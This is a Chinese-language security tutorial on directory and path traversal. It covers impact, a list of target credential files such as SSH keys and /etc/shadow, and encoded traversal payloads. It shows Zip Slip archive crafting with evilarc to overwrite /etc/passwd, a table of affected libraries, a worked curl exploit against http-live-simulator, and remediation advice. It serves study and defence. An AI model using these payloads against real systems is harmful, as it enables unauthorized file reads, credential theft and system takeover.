### 简介

* 漏洞名称:目录穿越(Directory traversal)  路径穿越(Path traversal)
* 漏洞原理:攻击者通过可控的输入，通过"参数值"、"构造的压缩文件"等形式，将构造的"路径"传递给后端逻辑，实现路径穿越。
* 漏洞案例: [CVE - directory traversal](https://www.cvedetails.com/vulnerability-list/opdirt-1/directory-traversal.html)

### 漏洞危害

* 漏洞危害:任意文件"CURD"操作 即 写入(新建+覆盖) 修改 读取 删除
  * 新建文件 - 上传压缩文件功能(常见于 手动更新升级包 恢复配置信息 等功能)
    * 例1 上传zip文件 如果后端解压逻辑直接解压文件 未考虑压缩包中的条目名称(文件名)可能包含`../` 则存在目录穿越漏洞. 可构造压缩包进行利用
  * 新建文件 - 上传文件功能
    * 例2 如果后端接受了文件名 且未考虑文件名中的`../` 直接拼接路径与文件名 则存在目录穿越漏洞. 可构造文件名进行利用 `../filename.txt`覆盖任意文件
  * 读取文件 - 下载文件功能.
    * 例3  如果后端接受了文件名 且未考虑文件名中的`../` 直接拼接路径与文件名 则存在目录穿越漏洞. 可构造文件名进行利用 `../filename.txt`读取任意文件
  * 修改文件 - 编辑文件功能.(常见于 文件管理功能 能够编辑文件信息、重命名文件)
    * 例4 如果后端接受了文件名 且未考虑文件名中的`../` 直接拼接路径与文件名 则存在目录穿越漏洞. 在文件管理功能处 重命名文件为`../etc/passwd` 实现读取任意文件

#### 任意文件读取漏洞

通过读取文件实现主机信息搜集:

* linux - 参考linux文件字典[dictionary/file_linux_info.txt](https://github.com/1135/dictionary/blob/master/file_linux_info.txt)
  * 凭证信息 获取ssh登录权限
    * `/root/.ssh/id_rsa` `~/.ssh/id_rsa` **ssh私钥**
    * `/root/.ssh/authorized_keys`
    * `/root/.ssh/id_ras.keystore`
    * `/root/.ssh/known_hosts`
    * `/etc/passwd` 登录用户名
    * `/etc/shadow` 登录口令密文  可用rainbow table破解(概率不大)
  * 敏感日志文件
    * `/root/.bash_history`用户历史命令记录文件
    * `/root/.mysql_history` MySQL历史命令记录文件
    * WEB应用日志等
  * 基本信息
    * `/proc/version`内核版本号
    * `/proc/cpuinfo`cpu信息
    * `/proc/meminfo`内存信息
  * 代码信息 读取web应用的代码做代码审计
    * Java中Tomcat的`WEB-INF`目录下的`WEB-INF/web.xml`等配置文件 得到`.class`等文件的路径字符串
    * PHP `php.ini`
  * 配置信息(可获得 凭证 ip port 域名 URL路径 .log等文件路径)
    * 数据库配置 redis `redis.conf`
    * 数据库配置 MySQL `/etc/my.cnf` `/etc/mysql/my.cnf`
    * 中间间配置 Nginx `nginx.conf`
    * 中间间配置 Apache `httpd.conf`
  * 进程信息
  * 计划任务信息
  * 网络与ACL信息
    * 获取ssh的ACL信息 `/etc/hosts.allow`中的IP被允许登录该主机ssh  而`/etc/hosts.deny`中的IP被禁止登录该主机的ssh
    * 获取IPv4的ACL策略 `/etc/sysconfig/iptables` IPv6的ACL策略`/etc/sysconfig/ip6tables`
    * 获取目标主机的TCP连接 `/proc/net/tcp`
    * 获取目标主机的UDP连接 `/proc/net/udp`
    * 获取目标主机的ARP缓存 `/proc/net/arp`
    * 从hosts获取域名及ip 可能有内网相关信息 `/etc/hosts`
* windows - 参考windows文件字典[dictionary/file_windows_info.txt](https://github.com/1135/dictionary/blob/master/file_windows_info.txt)


#### 任意文件写入漏洞

* web
  * get webshell - 把webshell写入到目标主机web目录
* linux
  * 覆盖鉴权认证文件 - 把已知ssh账号口令的`/etc/passwd`写入到目标主机 以登陆ssh
* ...

### 基础知识

系统相关

| |root directory|directory separator|
|:-------------:|--|-----|
|Unix-like OS|`/`|`/`|
|Windows|`<drive letter>:\`|`\` or `/`|


Unix-like OS(macOS下实际测试)
```
上级目录
../

当前目录
./

查看上级目录下的1.txt的命令有很多(因为./表示当前目录 加多个也不影响 没作用)
直接查看
cat ../1.txt

在跨目录之后使用./
cat .././1.txt
cat ../././1.txt

在跨目录之前使用./
cat ./../1.txt
cat ././../1.txt

在跨目录之前之后都使用./
cat ./.././1.txt
cat ././../././1.txt
```

### 测试方法

#### payload - 参数值字符串

使用dotdotpwn.txt或手工进行fuzz
```
# Encoding and double encoding
%2e%2e%2f represents ../
%2e%2e/ represents ../
..%2f represents ../ 
%2e%2e%5c represents ..\
%2e%2e\ represents ..\ 
..%5c represents ..\ 
%252e%252e%255c represents ..\ 
..%255c represents ..\

# Web容器对form和URL中的"百分比编码"执行一级解码(one level of decoding)
..%c0%af represents ../ 
..%c1%9c represents ..\ 
```

#### payload - 压缩文件

* 压缩文件 解压过程实现目录穿越
  * 压缩文件中的文件名 - 压缩包中的文件名带有`..` 在压缩包提取过程中 覆盖任意文件
    * [CVE-2001-1267](https://www.cvedetails.com/cve/CVE-2001-1267/) GNU tar 1.13.19及更早版本中的目录遍历漏洞
    * [CVE-2001-1268](https://www.cvedetails.com/cve/CVE-2001-1268/)Info-ZIP UnZip 5.42及更早版本中的目录遍历漏洞
    * [CVE-2016-10173](https://github.com/halostatue/minitar/issues/16) Minitar目录遍历漏洞
    * [CVE-2017-5946](https://github.com/rubyzip/rubyzip/issues/315) Rubyzip目录遍历漏洞 修复[diff](https://github.com/rubyzip/rubyzip/commit/ce4208fdecc2ad079b05d3c49d70fe6ed1d07016)
    * ...
  * 压缩文件中的文件为符号链接文件 - 期望通过解压symlinks文件 得到其指向的真实文件的内容
    * zip压缩包 成功 解压得到了symlinks文件指向的真实文件的内容
    * tar压缩包 失败 解压得到了symlinks文件自身
    * 其他压缩文件格式 暂未测试

### 例1 - Zip Slip系列漏洞

#### 原理

参考[ZIP File Format Specification](https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT)可知 压缩包内的文件名 可带相对路径(而不能带绝对路径 根路径)

```
       4.4.17.1 The name of the file, with optional relative path.
       The path stored MUST NOT contain a drive or
       device letter, or a leading slash.  All slashes
       MUST be forward slashes '/' as opposed to
       backwards slashes '\' for compatibility with Amiga
       and UNIX file systems etc.  If input came from standard
       input, there is no file name field.  
```

由此实现

构造压缩文件 -> 解压该压缩文件(archive extraction) -> 目录穿越导致任意文件写入(Arbitrary File Write) -> 远程命令执行

压缩文件类型 理论上包括`tar`, `jar`, `war`, `cpio`, `apk`, `rar`, `7z`...

#### 构造压缩文件的过程 - tar文件

构造特殊的压缩文件：因为常规zip软件不会允许待压缩文件 带有字符串`../`的文件名 所以使用对应标准库来创建

如 [evilarc/evilarc.py](https://github.com/ptoomey3/evilarc/blob/master/evilarc.py)

```
# 构造压缩文件
# testfile为解压后的文件
# --depth指定有几个../
# --os 为win时即指定路径分割符为反斜杠\ 为其他字符时则为正斜杠/
# --output-file指定文件名和后缀 支持的后缀有
# --path指定穿越后的目录

# 打开1.tar(无则新建) 添加3个文件 testfile 222 111
python evilarc.py testfile --os=unix --depth=1 --output-file=1.tar --path=admin/manage
python evilarc.py 222  --os=unix --depth=2 --output-file=1.tar -p admin/Bdir
python evilarc.py 111  --os=unix --depth=0 --output-file=1.tar
```


查看压缩文件详情

```
# 查看压缩文件详情的命令
7z l 1.tar
```

```
7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=utf8,Utf16=on,HugeFiles=on,64 bits,8 CPUs x64)

Scanning the drive for archives:
1 file, 10240 bytes (10 KiB)

Listing archive: 1.tar

--
Path = 1.tar
Type = tar
Physical Size = 10240
Headers Size = 7680
Code Page = UTF-8

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2019-05-12 12:39:36 .....            7          512  ../admin/manage/testfile
2019-01-13 17:40:49 .....          686         1024  ../../admin/Bdir/222
2019-01-12 19:19:22 .....          726         1024  111
------------------- ----- ------------ ------------  ------------------------
2019-05-12 12:39:36               1419         2560  3 files
```

解压

(bsdtar 2.8.3 - libarchive 2.8.3)

用mac自带的tar进行解压 `tar -xvf 1.tar` 结果显示如下

```
x ../admin/manage/testfile: Path contains '..'
x ../../admin/Bdir/222: Path contains '..'
x 111
tar: Error exit delayed from previous errors.
```

实际只有文件111是解压成功的，而同一压缩包的其他两个文件因为文件名包含了`..`而解压失败.(tar默认是禁止提取 文件名包含了`..`的文件)

#### 构造压缩文件的过程 - zip文件解压特殊文件名实现目录穿越

覆盖`/etc/passwd`文件 前提 有root权限
```
# 将passwd文件放到压缩包中 目录为../etc/passwd
python evilarc.py passwd --os=unix --depth=1 --path etc --output-file=1.zip
python evilarc.py passwd --os=unix --depth=2 --path etc --output-file=1.zip
python evilarc.py passwd --os=unix --depth=3 --path etc --output-file=1.zip
...
```

以便于“盲”覆盖目标系统中的`/etc/passwd`文件


#### 构造压缩文件的过程 - zip文件解压symlinks文件实现目录穿越

创建一个符号链接文件(symlinks)

`ln -s ../etc/passwd pass`

文件名`pass`

文件大小`19 bytes`


构造zip压缩包 将该文件压缩
```
python evilarc.py pass --os=unix --depth=0 --output-file=1.zip
```

解压
```
unzip 1.zip
```

解压过程无任何报错 提取出了一个文件

文件名:`pass`

大小:`7kb`

内容与`etc/passwd`完全相同

成功.

#### Zip Slip漏洞列表

参考自[zip-slip-vulnerability/README.md](https://github.com/snyk/zip-slip-vulnerability/blob/master/README.md)

受过影响的库(现已修复)

Affected Libraries


| Vendor         | Product                                                                                                                | Language   | Confirmed vulnerable | Fixed Version                                                                            | CVE              | Fixed(diff)                                                                                                                                                                 |
|----------------|------------------------------------------------------------------------------------------------------------------------|------------|----------------------|------------------------------------------------------------------------------------------|------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| npm library    | [unzipper](https://github.com/ZJONSSON/node-unzipper)                                                                  | JavaScript | YES                  | 0.8.13                                                                                   | [CVE-2018-1002203](https://snyk.io/vuln/npm:unzipper:20180415) | [17/4/2018](https://github.com/ZJONSSON/node-unzipper/pull/59)                                                                                                        |
| npm library    | [adm-zip](https://github.com/cthackers/adm-zip)                                                                        | JavaScript | YES                  | 0.4.9                                                                                    | [CVE-2018-1002204](https://snyk.io/vuln/npm:adm-zip:20180415) | [23/4/2018](https://github.com/cthackers/adm-zip/pull/212)                                                                                                            |
| Java library   | [codehaus/plexus-archiver](https://github.com/codehaus-plexus/plexus-archiver)                                         | Java       | YES                  | 3.6.0                                                                                    | [CVE-2018-1002200](https://snyk.io/vuln/SNYK-JAVA-ORGCODEHAUSPLEXUS-31680) | [6/5/2018](https://github.com/codehaus-plexus/plexus-archiver/pull/87)                                                                                                |
| Java library   | [zeroturnaround/zt-zip](https://github.com/zeroturnaround/zt-zip)                                                      | Java       | YES                  | 1.13                                                                                     | [CVE-2018-1002201](https://snyk.io/vuln/SNYK-JAVA-ORGZEROTURNAROUND-31681) | [26/4/2018](https://github.com/zeroturnaround/zt-zip/blob/master/src/main/java/org/zeroturnaround/zip/ZipUtil.java#L389:26)                                           |
| Java library   | [zip4j](http://www.lingala.net/zip4j/)                                                                                 | Java       | YES                  | [1.3.3](http://www.lingala.net/zip4j/includes/downloadzip4j.php?option=sources&fmt=zip) | [CVE-2018-1002202](https://snyk.io/vuln/SNYK-JAVA-NETLINGALAZIP4J-31679) | 13/6/2018                                                                                                                                                             |
| .NET library   | [DotNetZip.Semverd](https://github.com/haf/DotNetZip.Semverd)                                                          | .NET       | YES                  | 1.11.0                                                                                   | [CVE-2018-1002205](https://snyk.io/vuln/SNYK-DOTNET-DOTNETZIP-60245) | [7/5/2018](https://github.com/haf/DotNetZip.Semverd/compare/master...shana:bugs/relative-paths?expand=1)                                                              |
| .NET library   | [SharpCompress](https://github.com/adamhathcock/sharpcompress)                                                         | .NET       | YES                  | 0.21.0                                                                                   | [CVE-2018-1002206](https://snyk.io/vuln/SNYK-DOTNET-SHARPCOMPRESS-60246) | [2/5/2018](https://github.com/adamhathcock/sharpcompress/blob/2a5494a804dd3d6f5bec1ec79a52d54ffce610f5/src/SharpCompress/Archives/IArchiveEntryExtensions.cs#L58-L67) |
| Go library   | [mholt/archiver](https://github.com/mholt/archiver)                                                                    | Go         | YES                  | e4ef56d4                                                                                 | [CVE-2018-1002207](https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMMHOLTARCHIVERCMDARCHIVER-50071) | [17/4/2018](https://github.com/mholt/archiver/pull/65)                                                                                                                |
| Oracle         | [java.util.zip](https://docs.oracle.com/javase/8/docs/api/index.html?java/util/zip/package-summary.html)               | Java       | * No High Level API  | Documentation Fix                                                                        | N/A              |                                                                                                                                                                       |
| Apache         | [commons-compress](https://github.com/apache/commons-compress/)                                                        | Java       | * No High Level API  | Documentation Fix                                                                        | N/A              | [23/4/2018](https://github.com/apache/commons-compress/commit/97867f6fa3634c77dfafd76c89ecb1087f5cd1ae#diff-1d31ec0d64a29d487ff7377fd8d20cddR359)                     |
| .NET library   | [SharpZipLib](https://github.com/icsharpcode/SharpZipLib)                                                              | .NET       | YES                  | v1.0.0                                                                                   | [CVE-2018-1002208](https://snyk.io/vuln/SNYK-DOTNET-SHARPZIPLIB-60247) | [19/8/2018](https://github.com/icsharpcode/SharpZipLib/commit/5376c2daf1c0e0665398dee765af2047e43146ca) |
| Ruby gem       | [zip-ruby](https://bitbucket.org/winebarrel/zip-ruby/src/a0bceebd7bf031c8815a8359ba9befe6ead1bedc/zipruby/?at=default) | Ruby       | * No High Level API  |                                                                                          | N/A              |                                                                                                                                                                       |
| Ruby gem       | [rubyzip](https://github.com/rubyzip/rubyzip)      | Ruby       | [YES](https://github.com/rubyzip/rubyzip/issues/369)  |            | [CVE-2018-1000544](https://snyk.io/vuln/SNYK-RUBY-RUBYZIP-22039)         |                                                                                 |
| Ruby gem       | [zipruby](https://github.com/fjg/zipruby)                                                                              | Ruby       | * No High Level API  |                                                                                          | N/A              |                                                                                                                                                                       |
| Go library     | [archive](https://golang.org/pkg/archive/)                                                                             | Go         | * No High Level API  |                                                                                          | N/A              |                                                                                                                                                                       |
| Python library | [tarfile](https://docs.python.org/3/library/tarfile.html)                                                              | Python     | YES                  |                                                                                          | N/A              |                                                                                                                                                                       |
| C++/qt library | [quazip](https://github.com/stachenov/quazip/)                                                                         | C++        | YES                  | 0.7.6                                                                                    | CVE-2018-1002209              | [12/6/2018](https://github.com/stachenov/quazip/commit/5d2fc16a1976e5bf78d2927b012f67a2ae047a98)                                                                      |
| Clojure library| [Raynes/fs](https://github.com/Raynes/fs)                                                                              | Clojure    | YES                  | akvo/fs 20180618-134534.a44cdd5b                                                         | N/A              | [18/6/2018](https://github.com/akvo/fs/commit/894ea7d0ac4c49e356a3453405caab7a11650b3d)                                                                               |
| Go library | [cloudfoundry/archiver](https://github.com/cloudfoundry/archiver/)                                                                              | Go    | YES                  | [24/5/2018](https://github.com/cloudfoundry/archiver/commit/09b5706aa9367972c09144a450bb4523049ee840)                                                         | N/A              | [24/5/2018](https://github.com/cloudfoundry/archiver/commit/09b5706aa9367972c09144a450bb4523049ee840)                                                                               |






受过影响的项目(现已修复)

Projects Affected and Fixed

| Vendor              | Product                           | Fixed date(diff)                                                                                                                                               | Fixed version | CVE           | Vulnerable Code                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
|---------------------|-----------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------|---------------|---------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Apache Storm        | Storm                             | [2/5/2018](https://github.com/apache/storm/commit/1117a37b01a1058897a34e11ff5156e465efb692)                                                              | 1.1.3, 1.2.2         | CVE-2018-8008 | [#1](https://github.com/apache/storm/blob/master/storm-server/src/main/java/org/apache/storm/utils/ServerUtils.java#L389) [#2](https://github.com/apache/storm/blob/master/storm-server/src/main/java/org/apache/storm/utils/ServerUtils.java#L523) [#3](https://github.com/apache/storm/blob/master/storm-server/src/main/java/org/apache/storm/utils/ServerUtils.java#L592) [#4](https://github.com/apache/storm/blob/master/storm-server/src/main/java/org/apache/storm/utils/ServerUtils.java#L650) |
| Apache Software Foundation | Apache Hadoop                            | 30/5/2018 [#1](https://github.com/apache/hadoop/commit/745f203e577bacb35b042206db94615141fa5e6f) [#2](https://github.com/apache/hadoop/commit/e3236a9680709de7a95ffbc11b20e1bdc95a8605) | 2.7.7, 2.8.5, 2.9.2, 3.0.3, 3.1.1 | CVE-2018-8009 |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| Apache              | Maven                             |                                                                                                                                                          |               |               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| Apache              | Ant                               | [21/4/2018](https://github.com/apache/ant/commit/e56e54565804991c62ec76dad385d2bdda8972a7#diff-32b057b8e95fa2b3f7d644552643010aR11)                      | 1.9.12        |   CVE-2018-10886  |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| Pivotal             | spring-integration-zip            | [3/5/2018](https://github.com/spring-projects/spring-integration-extensions/commit/a5573eb232ff85199ff9bb28993df715d9a19a25)                             | 1.0.1         | CVE-2018-1261 |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| Pivotal             | spring-integration-zip            | [10/5/2018](https://github.com/spring-projects/spring-integration-extensions/commit/d10f537283d90eabd28af57ac97f860a3913bf9b)                            | 1.0.2         | CVE-2018-1263 |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| HP                  | Fortify Cloud Scan Jenkins Plugin | [27/4/2018](https://github.com/jenkinsci/fortify-cloudscan-plugin/commit/15a5270734280558f9356bd8681303b37f44f020#diff-443258e63dbf581491b1104125a59fd4) | [1.5.2](https://jenkins.io/security/advisory/2018-06-25/#SECURITY-870)     |               | [#1](https://github.com/jenkinsci/fortify-cloudscan-plugin/blob/cfa6d392abd900ce60a08bb830f99e821361b238/src/main/java/org/jenkinsci/plugins/fortifycloudscan/util/ArchiveUtil.java#L33:24)                                                                                                                                                                                                                                                                                                             |
| OWASP               | DependencyCheck                   | [7/5/2018](https://github.com/jeremylong/DependencyCheck/commit/c106ca919aa343b95cca0ffff0a0b5dc20b2baf7)                                                | [3.2.0](https://github.com/jeremylong/DependencyCheck/blob/master/RELEASE_NOTES.md#version-320-2018-05-21)         |  CVE-2018-12036  |                                                                                                                                                                                                                                                                                                                                                                                                    |
| Amazon              | AWS Toolkit for Eclipse           | [31/5/2018](https://github.com/aws/aws-toolkit-eclipse/commit/f2bd33e11299456979dc2092813a09e716f3d355)                                                  |               |               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| SonarSource         | [SonarQube](https://jira.sonarsource.com/browse/SONAR-10661)                         | [4/5/2018](https://github.com/SonarSource/sonarqube/commit/08438a2c47112f2fce1e512f6c843c908abed4c7#diff-6d8def68a00bf88a105528765f02fb95)               |   6.7.4 LTS, 7.2   |               | [#1](https://github.com/SonarSource/sonarqube/blob/c0d2705e610d771b8c66ef22e64530c7bca4f538/sonar-plugin-api/src/main/java/org/sonar/api/utils/ZipUtils.java#L148)                                                                                                                                                                                                                                                                                                                                      |
| Cinchapi            | Concourse                         | [30/5/2018](https://github.com/cinchapi/concourse/commit/9db7123029d103abaa909abd737876df7ace9957)                                                       |               |               | [#1](https://github.com/cinchapi/concourse/blob/a890d80a80298436995b42045474c6f01b53066b/concourse-driver-java/src/main/java/com/cinchapi/concourse/util/ZipFiles.java#L100)                                                                                                                                                                                                                                                                                                                            |
| Orient Technologies | OrientDB                          | [31/5/2018](https://github.com/orientechnologies/orientdb/commit/1dd754996682b5a7f467072b34747a33642d983b)                                               |               |               | [#1](https://github.com/orientechnologies/orientdb/blob/1c184f1295d1ce1538e5debac05addc7ca69b5b8/core/src/main/java/com/orientechnologies/orient/core/compression/impl/OZIPCompressionUtil.java#L87) [#2](https://github.com/orientechnologies/orientdb/blob/5684b63f6efb03d407d0175b9eab616b36bbecbd/etl/src/main/java/com/orientechnologies/orient/etl/util/OFileManager.java#L76)                                                                                                                    |
| FenixEdu            | Academic                          | [30/5/2018](https://github.com/FenixEdu/fenixedu-academic/commit/a64a568de3d3dd65338320239ecc7d6d94f3b36d)                                               |               |               | [#1](https://github.com/FenixEdu/fenixedu-academic/blob/674a7081d6a28cfadcae1cf732c11e9599cdedee/src/main/java/org/fenixedu/academic/util/FileUtils.java#L118)                                                                                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                 |
| Lucee            | Lucee                          | [5/6/2018](https://github.com/lucee/Lucee/commit/04a2d504ebe5472eddbe38c4333c0904bd8dc765)                                               |  5.2.7.63, 5.2.8.47    |               | [#1](https://github.com/lucee/Lucee/blob/ad2b44d9b6695e6ef8632eadf306c3f38e43885b/core/src/main/java/lucee/runtime/tag/Zip.java#L487)                                                                                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                 |
| groovy-common-extensions            | groovy-common-extensions                          | [3/7/2018](https://github.com/timyates/groovy-common-extensions/commit/ea5d3fb7b64edeac405d83193bfeac6dbcd1ad3f)                                               | [0.7.1](https://github.com/timyates/groovy-common-extensions/releases/tag/v0.7.1)    |               | [#1](https://github.com/timyates/groovy-common-extensions/blob/169fad28b6ec306979f06b5ec38cae4085bf05bd/src/main/groovy/com/bloidonia/groovy/extensions/FileExtensionMethods.groovy#L144)                                                                                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                 |
| fabric8            | fabric8                          | [5/6/2018](https://github.com/fabric8io/fabric8/commit/c7d4db1d2570579a7735b4d48a4380bc4b7152a5#diff-41610113b82d84309edcd091d69cd789)                                               | 2.2.170-85    |               | [#1](https://github.com/fabric8io/fabric8/blob/5d20ac54e81246b78dc343ff0504b815421f5704/components/fabric8-utils/src/main/java/io/fabric8/utils/Zips.java#L116)                                                                                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                 |
| Apache            | Tika                          | [19/9/2018](https://lists.apache.org/thread.html/ab2e1af38975f5fc462ba89b517971ef892ec3d06bee12ea2258895b@%3Cdev.tika.apache.org%3E)                                               | 1.19    |               |    
| Apache            | DeepLearning4J                          | [10/24/2018](https://github.com/deeplearning4j/deeplearning4j/pull/6630)                                           | 1.0.0-SNAPSHOT    |               | 
|                                                                                                                                                                                                                                 |



### 例2 - 单次替换

代码仓库

[http-live-simulator@1.0.6](https://github.com/prahladyeri/http-live-simulator/tree/8e85a1be562248d0d616c0e5092a3d71bbf5fe5f)

环境搭建
```
# macOS 10.14.4
cd /Users/xxx/Downloads

# Install the module
npm install -g http-live-simulator@1.0.6

# Run the server
http-live
```

漏洞利用
```
# Attempt to access a file from outside that project's directory
# 其中curl的参数--path-as-is 表示"Do not squash .. sequences in URL path" 不压缩url路径中的..

# 构造payload如下 都成功了

# payload1  将 `/../` 替换为 `//../../`
curl --path-as-is http://localhost:8080//../../../../etc/passwd
# 最终绝对路径为/Users/xxx/Downloads/../../../etc/passwd

# payload2  将 `/../` 替换为 `/./.././`
curl --path-as-is http://localhost:8080/./../././../././../././.././etc/passwd
# 最终绝对路径为/Users/xxx/Downloads/.././../././../././.././etc/passwd
# 为了便于理解 可以自行去除其中无实际作用的./ 得到与绕过方式1相同的最终绝对路径 /Users/xxx/Downloads/../../../../etc/passwd
```

payload1绕过过程分析 查看文件bin/http-live可知后端逻辑如下
```
# 71行 var pathname = url.parse(req.url, true).pathname;
# 直接从url中获取pathname的参数值 得到 //../../../../etc/passwd
# 72行 pathname = pathname.replace("/../","");  将参数值中的`/../` 替换为空 仅替换一次(修复无效 可被绕过).
# 此时 pathname参数值变为 /../../../etc/passwd
# 90行 拼接得到绝对路径 abspath = process.cwd() + pathname; #注意 process.cwd()返回当前目录/Users/xxx/Downloads 注意结尾不是斜杠符号
# 92行 此时绝对路径abspath值为 /Users/xxx/Downloads/../../../etc/passwd
# （所以构造payload时url中8000后面必须有两个连续的/才对 否则路径构造错误 文件不存在 跳出 返回404）
# 93行 if (fs.existsSync(abspath)) {  // 路径正确 文件存在	
# 94行 fs.readFile(abspath, function(err, data) { // 将绝对路径实参 abspath 传入到fs.readFile函数
# 98行 res.write(data); //将文件内容作为response body
# 99行 res.end(); //返回响应
# 实现了任意文件读取.
```


可见1.0.7 的修复

diff: https://github.com/prahladyeri/http-live-simulator/commit/354644525f1626c5921abac10913c0d47f1f1433

关键代码在`bin/http-live`中的72-74行 是将参数值中的`/../`替换为空 循环替换 直到不存在`/../`为止 如下
```
while(pathname.indexOf("/../") != -1) {
		pathname = pathname.replace("/../",""); //fix for path traversal bug
	}
```

---

为什么只用`/`测试 而不用`\`测试？
因为在这个例子中用到node库中url.parse函数 它会把`\`转换为`/` 参考node自带库中url.parse的定义 https://github.com/nodejs/node/blob/master/lib/url.js


#### 小结 - 测试`readFile`函数

测试一下node自带的fs模块中的`readFile`函数

1.读取普通文件(files)
```
# 读取普通文件 将文件内容转化为文本 输出
var mypath = "/Users/xxx/Downloads/../../../etc/passwd";fs.readFile(mypath,function(err,data){console.log(data.toString())})
# 如果过滤不严格可以实现目录穿越.
```


2.对"符号链接文件"(symlinks)的读取都是"预期行为"(expected behavior)

```
# 创建一个名为symfile的符号链接文件 指向../1.txt
ln -s ../1.txt symfile

# 用`readFile`函数读取它:一个名为symfile的符号链接文件
var mypath = "/Users/xxx/Downloads/symfile";fs.readFile(mypath,function(err,data){console.log(data.toString())})

# 结果:实际上可以读取到"符号链接文件"指向的真正文件的内容 规定目录之外的文件1.txt的内容也可以读取到

# 对"符号链接文件"(symlinks)的读写是目录穿越漏洞吗? 不是
# 因为 "符号链接文件"(symlinks)只能在本机有效,不存在真实的攻击场景.(上传任何symlinks到别的主机都不可能实现)
# 所以 对"符号链接文件"(symlinks)的读取都是"预期行为"(expected behavior)
```

#### 修复与防御

* 限制web应用可访问的目录
  * PHP 在配置文件php.ini中指定open_basedir的值，如windows下用`;`分割`open_basedir = D:\soft\sites\www.a.com\;` linux下用`：`分割`/home/wwwroot/tp5/:/tmp/:/var/tmp/:/proc/`
* web应用设计-避免路径可控（尤其关注"文件操作类"的功能与函数）
* web应用设计-循环替换"某些字符串"为空 如`..` `./` `.\` `\\` `//`等 并 使用编程语言函数获取"将要解压的文件夹路径"的"规范路径名" 并判断它是否以预期设计的合法的"目的文件夹"开头
* web应用设计-使用成熟的压缩解压操作库 避免文件解压过程中出现路径穿越漏洞
